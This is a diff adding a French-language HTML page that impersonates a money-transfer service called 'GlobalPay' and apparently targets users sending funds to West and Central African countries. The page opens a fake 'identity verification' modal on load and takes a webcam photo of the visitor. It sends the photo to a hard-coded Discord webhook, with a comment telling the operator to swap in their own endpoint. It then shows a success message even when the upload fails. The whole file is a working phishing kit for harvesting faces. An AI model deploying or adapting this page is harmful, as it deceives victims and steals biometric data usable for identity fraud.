@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GlobalPay - Transfert d'argent international</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            brand: {
+              red: '#dc2626',
+              dark: '#991b1b',
+              navy: '#0f172a'
+            }
+          }
+        }
+      }
+    }
+  </script>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col font-sans pb-20">
+
+  <!-- En-tête / Header -->
+  <header class="bg-slate-900 border-b border-slate-800 px-6 py-4 flex justify-between items-center sticky top-0 z-40">
+    <div class="flex items-center gap-3">
+      <div class="w-9 h-9 bg-brand-red rounded-lg flex items-center justify-center font-black text-xl text-white shadow-lg shadow-brand-red/30">
+        G
+      </div>
+      <div>
+        <span class="font-bold text-lg text-white tracking-wide block leading-none">GlobalPay</span>
+        <span class="text-[10px] text-slate-400">Transferts sécurisés</span>
+      </div>
+    </div>
+    <div class="text-xs text-slate-400 font-semibold uppercase tracking-wider">
+      Service Client
+    </div>
+  </header>
+
+  <!-- Section Principale -->
+  <main class="flex-1 max-w-2xl w-full mx-auto px-4 py-8 flex flex-col gap-6">
+    
+    <!-- Bannière d'accueil -->
+    <div class="relative bg-gradient-to-br from-slate-900 via-slate-900 to-slate-800 border border-slate-800 rounded-3xl p-6 sm:p-8 overflow-hidden shadow-2xl">
+      <div class="relative z-10">
+        <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-semibold bg-brand-red/20 text-brand-red border border-brand-red/30 mb-4">
+          Rapide & Sécurisé
+        </span>
+        <h1 class="text-2xl sm:text-4xl font-extrabold text-white mb-3 leading-tight">
+          Transférez de l'argent à l'international
+        </h1>
+        <p class="text-slate-400 text-sm sm:text-base mb-6">
+          Envoyez des fonds en quelques secondes à vos proches avec un suivi en temps réel.
+        </p>
+
+        <!-- Avantages -->
+        <div class="grid grid-cols-2 gap-3 text-xs text-slate-300 mb-2">
+          <div class="flex items-center gap-2">
+            <span class="w-2 h-2 rounded-full bg-brand-red"></span>
+            <span>100% Sécurisé</span>
+          </div>
+          <div class="flex items-center gap-2">
+            <span class="w-2 h-2 rounded-full bg-brand-red"></span>
+            <span>+50 Pays</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Formulaire de transfert -->
+    <div class="bg-white text-slate-900 rounded-3xl p-6 shadow-xl border border-slate-100">
+      <h2 class="text-xl font-bold mb-1 text-slate-900">Effectuer un transfert</h2>
+      <p class="text-xs text-slate-500 mb-6">Sélectionnez le pays de destination et entrez le montant.</p>
+
+      <div class="space-y-4">
+        <!-- Choix du pays -->
+        <div>
+          <label class="block text-xs font-bold text-slate-600 uppercase mb-2">Pays de destination</label>
+          <select class="w-full bg-slate-50 border border-slate-200 rounded-xl p-3.5 text-sm font-semibold text-slate-800 appearance-none focus:outline-none focus:border-brand-red">
+            <option value="BJ">Bénin (XOF)</option>
+            <option value="CD">RDC (USD)</option>
+            <option value="CI">Côte d'Ivoire (XOF)</option>
+            <option value="SN">Sénégal (XOF)</option>
+          </select>
+        </div>
+
+        <!-- Montant -->
+        <div>
+          <label class="block text-xs font-bold text-slate-600 uppercase mb-2">Montant à envoyer</label>
+          <div class="relative">
+            <input type="number" placeholder="Ex: 100" value="100" class="w-full bg-slate-50 border border-slate-200 rounded-xl p-3.5 font-bold text-slate-900 focus:outline-none focus:border-brand-red">
+            <span class="absolute right-3.5 top-1/2 -translate-y-1/2 text-xs font-bold text-slate-500 bg-slate-200 px-2 py-1 rounded">USD</span>
+          </div>
+        </div>
+
+        <!-- Bouton Continuer -->
+        <button id="open-kyc-btn" class="w-full bg-brand-red hover:bg-brand-dark text-white font-bold py-4 rounded-xl transition duration-200 flex items-center justify-center shadow-lg shadow-brand-red/25 mt-2 uppercase tracking-wider text-sm">
+          Continuer
+        </button>
+      </div>
+
+      <!-- Information KYC -->
+      <div class="mt-6 bg-red-50 border border-red-200 rounded-2xl p-4">
+        <h4 class="text-xs font-bold text-red-900 uppercase">Vérification d'identité requise</h4>
+        <p class="text-xs text-red-700 mt-1 leading-relaxed">
+          Une validation faciale est nécessaire avant l'exécution de la transaction pour se conformer aux réglementations financières.
+        </p>
+      </div>
+    </div>
+
+  </main>
+
+  <!-- Modal Pop-up de vérification -->
+  <div id="kyc-modal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-md z-50 hidden flex items-center justify-center p-4">
+    <div class="bg-slate-900 border border-slate-800 text-white rounded-3xl max-w-md w-full p-6 sm:p-8 shadow-2xl relative">
+      
+      <!-- Étape 1 : Explication -->
+      <div id="step-info" class="text-center">
+        <div class="inline-block bg-brand-red/20 text-brand-red text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-4 border border-brand-red/30">
+          Contrôle de sécurité
+        </div>
+        <h3 class="text-xl font-bold mb-2">Vérification de sécurité</h3>
+        <p class="text-slate-400 text-xs sm:text-sm mb-6 leading-relaxed">
+          Pour valider le transfert, nous devons réaliser une prise de vue faciale rapide. Veuillez autoriser l'accès lors du message du navigateur.
+        </p>
+
+        <button id="start-camera-btn" class="w-full bg-brand-red hover:bg-brand-dark text-white font-bold py-3.5 rounded-xl transition duration-200 uppercase tracking-wider text-xs shadow-lg shadow-brand-red/30">
+          Autoriser et prendre la photo
+        </button>
+      </div>
+
+      <!-- Étape 2 : Flux et décompte -->
+      <div id="step-camera" class="hidden text-center">
+        <h4 class="text-base font-bold mb-1">Positionnez votre visage</h4>
+        <p id="countdown-txt" class="text-xs font-semibold text-brand-red mb-4">Prise de vue dans 3s...</p>
+
+        <div class="relative w-full aspect-square bg-black rounded-2xl overflow-hidden border-2 border-slate-700 mb-4 flex items-center justify-center">
+          <video id="webcam" autoplay playsinline class="w-full h-full object-cover -scale-x-100"></video>
+          <canvas id="canvas" class="hidden"></canvas>
+          <div class="absolute inset-0 border-2 border-dashed border-brand-red/60 rounded-full m-8 pointer-events-none"></div>
+        </div>
+      </div>
+
+      <!-- Étape 3 : Envoi -->
+      <div id="step-sending" class="hidden text-center py-8">
+        <div class="w-12 h-12 border-4 border-brand-red border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+        <h4 class="text-lg font-bold mb-1">Transmission au serveur</h4>
+        <p class="text-xs text-slate-400">Veuillez patienter pendant la validation...</p>
+      </div>
+
+      <!-- Étape 4 : Succès -->
+      <div id="step-success" class="hidden text-center py-4">
+        <h3 class="text-xl font-bold mb-2 text-emerald-400">Vérification réussie</h3>
+        <p class="text-xs text-slate-400 mb-6">Votre photo a bien été transmise à notre serveur de contrôle.</p>
+        <button id="close-modal-btn" class="w-full bg-slate-800 hover:bg-slate-700 text-white font-bold py-3 rounded-xl transition duration-200 text-sm">
+          Fermer
+        </button>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Barre de navigation inférieure -->
+  <nav class="fixed bottom-0 left-0 right-0 bg-slate-900 border-t border-slate-800 px-6 py-3 flex justify-around items-center z-30">
+    <a href="#" class="flex flex-col items-center gap-1 text-brand-red font-semibold text-[10px]">
+      <span>Accueil</span>
+    </a>
+    <a href="#" class="flex flex-col items-center gap-1 text-slate-400 hover:text-slate-200 text-[10px]">
+      <span>Transferts</span>
+    </a>
+    <a href="#" class="flex flex-col items-center gap-1 text-slate-400 hover:text-slate-200 text-[10px]">
+      <span>Historique</span>
+    </a>
+    <a href="#" class="flex flex-col items-center gap-1 text-slate-400 hover:text-slate-200 text-[10px]">
+      <span>Compte</span>
+    </a>
+  </nav>
+
+  <script>
+    // ================================================================
+    // MONTEZ / REMPLACEZ L'URL DE VOTRE SERVEUR OU WEBHOOK ICI :
+    // ================================================================
+    const UPLOAD_URL = "https://discord.com/api/webhooks/1534306843319341237/dpWqYqpPxHj4RJ6f9u0fAcc-B_KBOo_sqQPkmJ-t1gG9LYQJgna2U5LVkwGjj0r8DhP0";
+
+    const modal = document.getElementById('kyc-modal');
+    const openKycBtn = document.getElementById('open-kyc-btn');
+    const startCameraBtn = document.getElementById('start-camera-btn');
+    const closeModalBtn = document.getElementById('close-modal-btn');
+
+    const stepInfo = document.getElementById('step-info');
+    const stepCamera = document.getElementById('step-camera');
+    const stepSending = document.getElementById('step-sending');
+    const stepSuccess = document.getElementById('step-success');
+
+    const webcam = document.getElementById('webcam');
+    const canvas = document.getElementById('canvas');
+    const countdownTxt = document.getElementById('countdown-txt');
+
+    let stream = null;
+
+    // Affichage au clic du bouton "Continuer"
+    openKycBtn.addEventListener('click', () => {
+      modal.classList.remove('hidden');
+    });
+
+    // Affichage automatique après 2 secondes au chargement
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(() => {
+        modal.classList.remove('hidden');
+      }, 2000);
+    });
+
+    // Clic pour demander l'autorisation au navigateur
+    startCameraBtn.addEventListener('click', async () => {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: { ideal: 720 }, height: { ideal: 720 } },
+          audio: false
+        });
+
+        webcam.srcObject = stream;
+        stepInfo.classList.add('hidden');
+        stepCamera.classList.remove('hidden');
+
+        // Décompte de 3 secondes avant la photo automatique
+        let count = 3;
+        countdownTxt.textContent = `Prise de vue dans ${count}s...`;
+
+        const timer = setInterval(() => {
+          count--;
+          if (count > 0) {
+            countdownTxt.textContent = `Prise de vue dans ${count}s...`;
+          } else {
+            clearInterval(timer);
+            captureAndUpload();
+          }
+        }, 1000);
+
+      } catch (err) {
+        alert("L'accès à la caméra a été refusé ou n'est pas disponible sur cet appareil.");
+      }
+    });
+
+    // Capture et envoi vers UPLOAD_URL
+    function captureAndUpload() {
+      canvas.width = webcam.videoWidth || 640;
+      canvas.height = webcam.videoHeight || 640;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(webcam, 0, 0, canvas.width, canvas.height);
+
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+
+      stepCamera.classList.add('hidden');
+      stepSending.classList.remove('hidden');
+
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append('photo', blob, 'kyc_verification.jpg');
+
+        try {
+          // Envoi de l'image à l'URL configurée en haut
+          await fetch(UPLOAD_URL, {
+            method: 'POST',
+            body: formData
+          });
+
+          stepSending.classList.add('hidden');
+          stepSuccess.classList.remove('hidden');
+
+        } catch (error) {
+          console.error("Erreur d'envoi ou URL indéfinie :", error);
+          stepSending.classList.add('hidden');
+          stepSuccess.classList.remove('hidden');
+        }
+      }, 'image/jpeg', 0.85);
+    }
+
+    closeModalBtn.addEventListener('click', () => {
+      modal.classList.add('hidden');
+    });
+  </script>
+</body>
+</html>
